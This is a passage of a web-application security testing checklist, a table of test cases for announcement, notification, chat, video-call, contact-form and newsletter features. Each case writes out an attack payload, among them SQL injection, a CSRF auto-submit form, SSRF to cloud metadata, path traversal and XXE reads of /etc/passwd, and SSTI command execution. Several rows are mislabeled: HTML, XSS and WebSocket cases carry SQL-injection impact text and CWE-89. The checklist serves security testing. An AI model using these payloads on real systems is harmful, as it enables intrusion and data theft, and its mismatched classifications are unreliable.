| COMM-127 | Announcement SQL Injection | Injection (WSTG-INPV-05) | Announcement / Broadcast | 1. Search or filter announcements.<br>2. Inject SQL payloads in search parameters.<br>3. If announcement creation is possible inject in title or body fields. | Application must use parameterized queries for all announcement-related database operations. | <code>GET /api/announcements?search=' OR 1=1--;title=Test' UNION SELECT password FROM admins--</code> | SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks). | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | SQLMap;Burp Suite | CWE-89; [SQLi kit](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings |
| COMM-128 | Broadcast Message Spoofing | Broken Access Control (WSTG-AUTHZ-02) | Announcement / Broadcast | 1. Intercept a broadcast message request.<br>2. Modify the sender or author field to impersonate an admin or system.<br>3. Check if the spoofed broadcast appears as if from the impersonated user. | Application must determine broadcast sender from the authenticated admin session and not accept client-provided sender information. | <code>Change author=regular_user to author=system_admin or sender_name=CEO in broadcast request</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman | CWE-639; [IDOR kit](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| COMM-129 | Announcement Targeting Manipulation | Business Logic (WSTG-BUSL-01) | Announcement / Broadcast | 1. If announcements can target specific user groups intercept the request.<br>2. Modify the target audience to include unauthorized groups.<br>3. Check if targeting restrictions are enforced. | Application must validate announcement targeting against authorized groups and prevent unauthorized audience expansion. | <code>Change target_group=support_team to target_group=all_users or target_group=admin_team</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Postman | CWE-840; PortSwigger Business logic |
| COMM-130 | Announcement CSRF | CSRF (WSTG-SESS-05) | Announcement / Broadcast | 1. Craft a malicious page that auto-submits an announcement creation request using admin's session.<br>2. Lure admin to visit.<br>3. Check if a rogue announcement is published. | Application must validate CSRF tokens on all announcement creation and broadcast endpoints. | <code>&lt;form action='https://target.com/api/announcements/create' method='POST'&gt;&lt;input name='title' value='System Down'&gt;&lt;input name='body' value='All data lost'&gt;&lt;/form&gt;&lt;script&gt;document.forms[0].submit()&lt;/script&gt;</code> | CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO. | High | 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N) | Burp Suite;Custom HTML | CWE-352; [CSRF kit](#/checklist/csrf); PortSwigger CSRF + SameSite |
| COMM-131 | Announcement Deletion IDOR | Broken Access Control (WSTG-AUTHZ-04) | Announcement / Broadcast | 1. Delete own announcement or draft.<br>2. Intercept and change announcement_id to another announcement.<br>3. Check if unauthorized deletion occurs. | Application must verify that the user has permission to delete the specific announcement before processing the deletion. | <code>DELETE /api/announcements/ANN-2001 with non-author admin credentials;DELETE with regular user credentials</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Postman | CWE-639; [IDOR kit](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| COMM-132 | Broadcast Priority Escalation | Business Logic (WSTG-BUSL-01) | Announcement / Broadcast | 1. Create an announcement with normal priority.<br>2. Intercept and modify priority to critical or emergency.<br>3. Check if priority escalation bypasses approval workflows. | Application must enforce priority-level authorization and require additional approval for high-priority broadcasts. | <code>Change priority=normal to priority=critical or priority=emergency in announcement creation request</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Postman | CWE-840; PortSwigger Business logic |
| COMM-133 | HTML Injection in Broadcast Messages | Injection (WSTG-INPV-03) | Announcement / Broadcast | 1. Inject HTML content in broadcast messages.<br>2. Include phishing links or misleading UI elements.<br>3. Submit and check if HTML renders for all recipients. | Application must sanitize HTML in broadcast messages to prevent content injection and phishing. | <code>body=&lt;h1 style='color:red'&gt;URGENT: Your account is suspended&lt;/h1&gt;&lt;a href='https://evil.com'&gt;Verify Now&lt;/a&gt;</code> | SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks). | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Browser | CWE-89; [SQLi kit](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings |
| COMM-134 | Announcement Scheduling Manipulation | Business Logic (WSTG-BUSL-01) | Announcement / Broadcast | 1. Schedule an announcement for future publication.<br>2. Intercept and change the scheduled time to immediate or past time.<br>3. Check if the announcement publishes instantly bypassing review. | Application must validate scheduled times server-side and enforce any review or approval processes regardless of scheduling. | <code>Change scheduled_at=2025-12-25T00:00:00Z to scheduled_at=2020-01-01T00:00:00Z or scheduled_at=now</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Postman | CWE-840; PortSwigger Business logic |
| COMM-135 | Email Notification SSRF via Dynamic Content | SSRF (WSTG-INPV-19) | Email Notifications | 1. If email notifications fetch remote content like images or tracking pixels check for SSRF.<br>2. Inject internal URLs in fields that become image sources in emails.<br>3. Check if the server fetches internal resources. | Application must validate and whitelist all URLs fetched for email content rendering blocking internal network access. | <code>profile_image_url=http://169.254.169.254/latest/meta-data/;company_logo=http://localhost:8080/admin</code> | SSRF -&gt; internal-service reach / cloud metadata credential theft. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Collaborator | CWE-918; [SSRF kit](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger |
| COMM-136 | Email Notification Delivery Status Information Leak | Information Disclosure (WSTG-INFO-05) | Email Notifications | 1. Trigger email notifications to invalid addresses.<br>2. Check if bounce notifications or delivery status reports expose internal mail server configuration.<br>3. Review SMTP headers in received emails. | Application must not expose internal SMTP server details in bounce notifications or email headers visible to end users. | <code>Check email headers for X-Originating-IP;internal mail server names;software versions;internal routing paths</code> | Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Email Client;SMTP Tools;MXToolbox | CWE-200; [JWT kit](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger |
| COMM-137 | SMS Unicode Exploitation | Input Validation (WSTG-INPV-01) | SMS Notifications | 1. Send SMS notification trigger with Unicode characters.<br>2. Check if Unicode characters cause SMS truncation or splitting revealing partial sensitive data.<br>3. Test for GSM encoding issues. | Application must handle Unicode properly in SMS and avoid sending sensitive data that could be split across multiple SMS segments. | <code>Inject Unicode characters like emojis before sensitive content to force SMS splitting at sensitive data boundaries</code> | Improper input validation -&gt; downstream injection / logic abuse. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Postman | CWE-20; [XSS kit](#/checklist/xss); OWASP Input Validation Cheat Sheet |
| COMM-138 | SMS Delivery Report IDOR | Broken Access Control (WSTG-AUTHZ-04) | SMS Notifications | 1. Check delivery status of own SMS notification.<br>2. Change the message_id or reference to another user's SMS.<br>3. Check if delivery status for other users' SMS is accessible. | Application must verify ownership before displaying SMS delivery status information. | <code>GET /api/sms/delivery-status/MSG-2001 with non-owner credentials</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Postman | CWE-639; [IDOR kit](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| COMM-139 | Push Notification Topic Hijacking | Broken Access Control (WSTG-AUTHZ-02) | Push Notifications | 1. If push notifications use topic-based subscription subscribe to admin or system topics.<br>2. Check if unauthorized topic subscriptions receive privileged notifications. | Application must enforce authorization on topic subscriptions and prevent users from subscribing to privileged notification topics. | <code>POST /api/push/subscribe-topic with topic=admin_alerts or topic=system_debug or topic=internal_monitoring</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Postman | CWE-639; [IDOR kit](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| COMM-140 | Push Notification Payload Size Abuse | Business Logic (WSTG-BUSL-05) | Push Notifications | 1. If push notification content is user-influenced create extremely large payloads.<br>2. Check for size limits.<br>3. Monitor for resource exhaustion or denial of service. | Application must enforce payload size limits on push notifications and reject oversized content. | <code>Trigger push notification containing 1MB+ of data in notification body</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Custom Scripts | CWE-840; PortSwigger Business logic |
| COMM-141 | In-App Notification Link Injection | Injection (WSTG-INPV-01) | In-App Notifications | 1. If notifications contain action links check if the link URL can be controlled.<br>2. Inject javascript: or data: URIs.<br>3. Check for open redirect via notification links. | Application must validate all notification action URLs against a whitelist of allowed schemes and domains. | <code>action_url=javascript:alert(document.cookie);action_link=data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;;next_url=//evil.com</code> | SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks). | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Browser | CWE-89; [SQLi kit](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings |
| COMM-142 | In-App Notification Persistence After Account Deletion | Privacy (WSTG-INFO-05) | In-App Notifications | 1. Create notifications referencing user-generated content.<br>2. Delete the user account.<br>3. Check if notification data persists and is accessible to other users after account deletion. | Application must properly handle notification data cleanup when referenced accounts are deleted to prevent data leakage. | <code>Delete account and check if notifications referencing deleted user's data still display personal information</code> | Privacy violation -&gt; exposure of personal data (PII) beyond the intended audience. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Manual Testing | CWE-359; [IDOR kit](#/checklist/idor); OWASP Privacy Risks; GDPR |
| COMM-143 | WebSocket Connection Limit Abuse | Business Logic (WSTG-BUSL-05) | Real-time Updates (WebSocket) | 1. Open many simultaneous WebSocket connections from a single account.<br>2. Check for connection limits per user.<br>3. Attempt to exhaust server WebSocket capacity. | Application must limit concurrent WebSocket connections per user and implement server-level connection pooling. | <code>Open 1000+ concurrent WebSocket connections from same account;test server stability under connection pressure</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | wscat;Custom Scripts;JMeter | CWE-840; PortSwigger Business logic |
| COMM-144 | WebSocket Message Tampering | Injection (WSTG-INPV-01) | Real-time Updates (WebSocket) | 1. Intercept WebSocket messages between client and server.<br>2. Modify message content in transit.<br>3. Check if tampered messages are processed without integrity verification. | Application must implement message integrity checks and validate all incoming WebSocket messages server-side. | <code>Intercept and modify WebSocket message {"action":"read_notification",id:"1001"} to {"action":"delete_all",id:"&#42;"}</code> | SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks). | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;wscat;mitmproxy | CWE-89; [SQLi kit](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings |
| COMM-145 | WebSocket Origin Validation Bypass | Security Misconfiguration (WSTG-CONF-07) | Real-time Updates (WebSocket) | 1. Connect to the WebSocket endpoint from an unauthorized origin.<br>2. Modify the Origin header.<br>3. Check if the server validates the Origin during the handshake. | Application must validate the Origin header during WebSocket handshake and reject connections from unauthorized origins. | <code>Connect with Origin: https://evil.com;Origin: null;remove Origin header entirely during WebSocket upgrade</code> | Security misconfiguration -&gt; weakened control exploitable via the mapped attack. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;wscat;Custom Scripts | CWE-16; OWASP Security Misconfiguration (A05) |
| COMM-146 | Notification Center API Rate Limiting | Business Logic (WSTG-BUSL-05) | Notification Center | 1. Send rapid requests to the notification center API.<br>2. Check for rate limiting.<br>3. Attempt to bypass rate limits.<br>4. Test for performance degradation under high load. | Application must implement rate limiting on notification center API endpoints to prevent abuse. | <code>Send 1000+ GET /api/notifications requests per minute;bypass with X-Forwarded-For rotation</code> | Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite Intruder;JMeter | CWE-799; [Account Takeover kit](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger |
| COMM-147 | Notification Center GraphQL Over-Fetching | Injection (WSTG-INPV-01) | Notification Center | 1. If notifications use GraphQL craft deeply nested queries.<br>2. Request excessive fields through notification relationships.<br>3. Check for data over-exposure. | Application must implement field-level authorization and query depth limiting in GraphQL notification endpoints. | <code>{notifications{id;message;user{id;email;password;orders{id;total;paymentMethod{cardNumber}}}}}</code> | GraphQL abuse -&gt; introspection/IDOR/batching DoS -&gt; data exposure or availability. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;InQL;GraphQL Voyager | CWE-400; [IDOR kit](#/checklist/idor); OWASP GraphQL Cheat Sheet; PortSwigger |
| COMM-148 | Read Status Privacy Violation | Privacy (WSTG-INFO-05) | Read / Unread Status | 1. Send a notification to another user.<br>2. Check if read receipts reveal when and where the notification was read.<br>3. Verify if read status tracking is disclosed to senders. | Application must respect user privacy preferences regarding read receipts and not expose detailed read information without consent. | <code>Check API response for read_at;read_device;read_ip;read_location fields visible to notification sender</code> | Privacy violation -&gt; exposure of personal data (PII) beyond the intended audience. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Postman | CWE-359; [IDOR kit](#/checklist/idor); OWASP Privacy Risks; GDPR |
| COMM-149 | Read Status Manipulation for Social Engineering | Business Logic (WSTG-BUSL-01) | Read / Unread Status | 1. Mark notifications as unread after reading them.<br>2. Check if this creates false urgency indicators.<br>3. Test if read status can be manipulated to deceive other users or systems. | Application must maintain accurate read status history and prevent manipulation that could facilitate social engineering. | <code>Toggle read status repeatedly;mark critical notifications as unread to avoid audit trail detection</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | Low | 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Postman | CWE-840; PortSwigger Business logic |
| COMM-150 | Notification Preference Enumeration | Information Disclosure (WSTG-INFO-04) | Notification Preferences | 1. Access notification preference endpoints for various user IDs.<br>2. Check if preferences reveal user behavior patterns.<br>3. Enumerate user IDs through preference endpoints. | Application must not expose notification preferences to unauthorized users and must prevent user enumeration through preference endpoints. | <code>GET /api/notification-preferences?user_id=1 through user_id=10000 and note valid vs invalid responses</code> | Username/account enumeration -&gt; a valid-target list that fuels credential stuffing / phishing / ATO. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite Intruder;Custom Scripts | CWE-204; [Account Takeover kit](#/checklist/ato); OWASP WSTG-IDNT-04 |
| COMM-151 | Notification Channel Override Attack | Business Logic (WSTG-BUSL-01) | Notification Preferences | 1. Set notification preferences to in-app only.<br>2. Intercept the preference update.<br>3. Add hidden channels like sms_enabled=true or email_enabled=true.<br>4. Check if notifications are sent via channels the user did not select. | Application must strictly enforce user-selected notification channels and not enable additional channels through parameter injection. | <code>Add sms_enabled=true&amp;email_enabled=true&amp;push_enabled=true to preference update even when user selected only in_app</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Postman | CWE-840; PortSwigger Business logic |
| COMM-152 | Digest Email Content SSRF via Aggregated Links | SSRF (WSTG-INPV-19) | Digest Emails (Daily/Weekly) | 1. If digest emails fetch preview images or content for aggregated items inject internal URLs in item images or links.<br>2. Trigger digest generation.<br>3. Check for SSRF. | Application must validate all URLs fetched during digest email generation and block access to internal network resources. | <code>Create item with image_url=http://169.254.169.254/latest/meta-data/ that gets aggregated into digest email</code> | SSRF -&gt; internal-service reach / cloud metadata credential theft. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Collaborator | CWE-918; [SSRF kit](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger |
| COMM-153 | Digest Email Data Aggregation Leakage | Information Disclosure (WSTG-INFO-05) | Digest Emails (Daily/Weekly) | 1. Trigger a digest email.<br>2. Check if the aggregated content includes data the user should not have access to.<br>3. Verify authorization on aggregated data items. | Digest emails must only aggregate data the user is authorized to see and not leak cross-user or privileged information. | <code>Review digest email for notifications or activities from private channels or other users' data</code> | Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Email Client;Burp Suite | CWE-200; [JWT kit](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger |
| COMM-154 | Transactional Email Token Leakage | Information Disclosure (WSTG-INFO-05) | Transactional Emails | 1. Trigger transactional emails containing action tokens like password reset or verification.<br>2. Check if tokens are exposed in email headers or tracking links.<br>3. Verify token security. | Transactional email tokens must be cryptographically random and not leaked through email headers or tracking parameters. | <code>Check email for reset_token in Referer-leaking links;token in tracking pixel URL;token in email headers</code> | Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Email Client;Burp Suite | CWE-200; [JWT kit](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger |
| COMM-155 | Transactional Email Spoofing Prevention Check | Security Misconfiguration (WSTG-CONF-01) | Transactional Emails | 1. Check SPF/DKIM/DMARC records for the sending domain.<br>2. Attempt to spoof transactional emails from the application's domain.<br>3. Verify email authentication headers. | Application must configure SPF/DKIM/DMARC properly to prevent spoofing of transactional emails from the application's domain. | <code>dig TXT target.com;dig TXT _dmarc.target.com;dig TXT selector._domainkey.target.com;test spoofing</code> | Security misconfiguration -&gt; weakened control exploitable via the mapped attack. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | MXToolbox;dig;Email Spoofing Tools | CWE-16; OWASP Security Misconfiguration (A05) |
| COMM-156 | Marketing Email Pixel Tracking SSRF | SSRF (WSTG-INPV-19) | Marketing Emails | 1. If marketing emails include tracking pixels from user-controllable URLs check for SSRF.<br>2. Inject internal URLs as custom tracking endpoints.<br>3. Verify server-side fetching. | Application must validate tracking pixel URLs and prevent SSRF through marketing email tracking mechanisms. | <code>tracking_pixel_url=http://169.254.169.254/latest/meta-data/;custom_tracker=http://localhost:9200/_cluster/health</code> | SSRF -&gt; internal-service reach / cloud metadata credential theft. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Collaborator | CWE-918; [SSRF kit](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger |
| COMM-157 | Marketing Email A/B Test Content Injection | Injection (WSTG-INPV-03) | Marketing Emails | 1. If A/B testing for marketing emails is exposed check if variant content can be manipulated.<br>2. Inject malicious content in A/B test variants.<br>3. Verify content validation. | Application must sanitize and validate all A/B test variant content and restrict variant creation to authorized marketing roles. | <code>Inject XSS or phishing content in variant_b_content=&lt;script&gt;alert(1)&lt;/script&gt; or variant content with malicious links</code> | SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks). | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Postman | CWE-89; [SQLi kit](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings |
| COMM-158 | Chat Message Editing Race Condition | Business Logic (WSTG-BUSL-08) | Chat / Messaging | 1. Send a chat message.<br>2. Rapidly edit the message to change content after it has been read.<br>3. Check if edit history is maintained.<br>4. Test for race conditions in edit and delete. | Application must maintain message edit history and implement proper concurrency controls for message modifications. | <code>Send message then rapidly PUT /api/chat/messages/MSG-1001 with different content;check if original is preserved</code> | Race condition -&gt; limit/uniqueness bypass (duplicate accounts, rate-limit defeat, double-spend). | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Turbo Intruder;Burp Suite | CWE-362; [Race Condition kit](#/checklist/racecondition); James Kettle Smashing the State Machine |
| COMM-159 | Chat Message Search Data Leakage | Broken Access Control (WSTG-AUTHZ-04) | Chat / Messaging | 1. Search chat messages.<br>2. Check if search results include messages from conversations the user is not part of.<br>3. Test search scope limitations. | Application must scope chat search results to only conversations the authenticated user is a participant in. | <code>GET /api/chat/search?q=confidential and check if results include messages from non-participating conversations</code> | Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman | CWE-200; [JWT kit](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger |
| COMM-160 | Chat User Presence Information Leakage | Information Disclosure (WSTG-INFO-05) | Chat / Messaging | 1. Check user online/offline status indicators.<br>2. Monitor presence status for users not in your contact list.<br>3. Verify if presence data can be used for surveillance. | Application must respect user privacy settings for presence status and not expose online status to unauthorized users. | <code>GET /api/chat/presence?user_id=1002 or subscribe to WebSocket presence channel for non-contact users</code> | Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;wscat | CWE-200; [JWT kit](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger |
| COMM-161 | Chat Group Creation Authorization Bypass | Broken Access Control (WSTG-AUTHZ-02) | Chat / Messaging | 1. Create a chat group.<br>2. Add users who have not consented to join.<br>3. Add admin users or support staff.<br>4. Check if group membership is validated. | Application must require user consent or authorization before adding them to chat groups. | <code>POST /api/chat/groups/create with members=[1001;1002;admin_user;support_user] without their consent</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Postman | CWE-639; [IDOR kit](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| COMM-162 | Chat Attachment Path Traversal | Path Traversal (WSTG-INPV-10) | Chat / Messaging | 1. Download a chat attachment.<br>2. Modify the file path parameter in the download request.<br>3. Attempt to read arbitrary files from the server. | Application must validate file paths and restrict access to authorized attachment directories only. | <code>GET /api/chat/attachments/download?file=../../../etc/passwd;file=....//....//app/config/database.yml</code> | Path traversal -&gt; secret/cross-user file read or out-of-dir write -&gt; RCE. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman | CWE-22; [Path Traversal kit](#/checklist/pathtraversal); PortSwigger path traversal; Orange Tsai |
| COMM-163 | Video Call SRTP Key Exchange Weakness | Cryptography (WSTG-CRYP-01) | Video Calling | 1. Analyze the SRTP key exchange mechanism.<br>2. Check for weak key exchange protocols.<br>3. Test if SRTP keys can be intercepted or predicted.<br>4. Verify SRTP fingerprint validation. | Application must use strong SRTP key exchange mechanisms like DTLS-SRTP and verify fingerprints to prevent MITM attacks. | <code>Capture DTLS handshake;check for weak cipher suites;test SRTP fingerprint mismatch acceptance</code> | Weak/broken cryptography -&gt; data exposure, token forgery, integrity bypass. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Wireshark;WebRTC Internals;Custom Tools | CWE-327; OWASP Cryptographic Failures (A02); WSTG-CRYP |
| COMM-164 | Video Call Recording Unauthorized Download | Broken Access Control (WSTG-AUTHZ-04) | Video Calling | 1. If call recordings exist enumerate recording URLs.<br>2. Access recordings without proper authorization.<br>3. Check for direct object reference vulnerabilities in recording storage. | Application must enforce authorization on recording access and use non-guessable storage paths with signed URLs. | <code>Enumerate GET /api/recordings/REC-0001 through REC-9999;access S3 URLs directly without auth tokens</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite Intruder;ffuf | CWE-639; [IDOR kit](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| COMM-165 | Video Call Lobby Bypass | Authentication (WSTG-ATHN-01) | Video Calling | 1. If calls have a lobby or waiting room attempt to bypass it.<br>2. Join directly to the call room without host approval.<br>3. Modify the join request to skip lobby. | Application must enforce lobby or waiting room access controls server-side and prevent unauthorized direct room access. | <code>Add skip_lobby=true or approved=true to POST /api/video/join/ROOM-1001;modify WebSocket join message</code> | Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat). | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Postman | CWE-640; [Account Takeover kit](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups |
| COMM-166 | Contact Form XXE via XML Content Type | Injection (WSTG-INPV-07) | Contact Form | 1. Change the Content-Type of the contact form submission to application/xml.<br>2. Submit XML with XXE payload.<br>3. Check if the server processes XML and resolves external entities. | Application must validate Content-Type and disable external entity processing if XML parsing is supported. | <code>Change Content-Type to application/xml and submit &lt;?xml version='1.0'?&gt;&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM 'file:///etc/passwd'&gt;]&gt;&lt;contact&gt;&lt;message&gt;&amp;xxe;&lt;/message&gt;&lt;/contact&gt;</code> | XXE -&gt; local file read / SSRF / OOB exfiltration. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;OWASP ZAP | CWE-611; [XXE kit](#/checklist/xxe); PortSwigger XXE |
| COMM-167 | Contact Form Blind SSRF via URL Fields | SSRF (WSTG-INPV-19) | Contact Form | 1. If the contact form has website or URL fields submit internal URLs.<br>2. Check if the server makes requests to submitted URLs for validation or preview.<br>3. Monitor for SSRF. | Application must not fetch user-provided URLs server-side from contact form submissions or must validate against an allowlist. | <code>website=http://169.254.169.254/latest/meta-data/;url=http://localhost:8080/admin;website=http://internal-service:3306/</code> | SSRF -&gt; internal-service reach / cloud metadata credential theft. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Collaborator | CWE-918; [SSRF kit](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger |
| COMM-168 | Newsletter Double Opt-In Bypass | Business Logic (WSTG-BUSL-02) | Newsletter Subscription | 1. Subscribe to the newsletter.<br>2. Check if double opt-in is required.<br>3. Attempt to bypass the confirmation step by directly calling the confirmation endpoint with guessed tokens. | Application must use cryptographically random confirmation tokens and enforce the double opt-in process. | <code>Enumerate /newsletter/confirm?token=0001 through token=9999;try /newsletter/confirm?email=test@test.com&amp;force=true</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite Intruder;Custom Scripts | CWE-840; PortSwigger Business logic |
| COMM-169 | Newsletter Subscription Mass Registration | Business Logic (WSTG-BUSL-05) | Newsletter Subscription | 1. Script automated newsletter subscriptions with thousands of different email addresses.<br>2. Check for rate limiting.<br>3. Test if the subscription system can be abused for spam or list pollution. | Application must implement rate limiting and CAPTCHA on newsletter subscriptions to prevent automated mass registration. | <code>Send 10000+ POST /api/newsletter/subscribe with generated email addresses to pollute subscriber list</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite Intruder;Custom Scripts | CWE-840; PortSwigger Business logic |
| COMM-170 | Announcement Content SSTI | Injection (WSTG-INPV-18) | Announcement / Broadcast | 1. If announcement creation is accessible inject SSTI payloads in announcement content.<br>2. Submit and view the rendered announcement.<br>3. Check if template expressions are evaluated. | Application must escape template syntax in announcement content and render announcements as static content. | <code>title={{7&#42;7}};body=${T(java.lang.Runtime).getRuntime().exec('id')};content=&lt;%=system('whoami')%&gt;</code> | Server-side template injection -&gt; remote code execution on the app server. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Tplmap | CWE-1336; [SSTI kit](#/checklist/ssti); PortSwigger SSTI (James Kettle) |
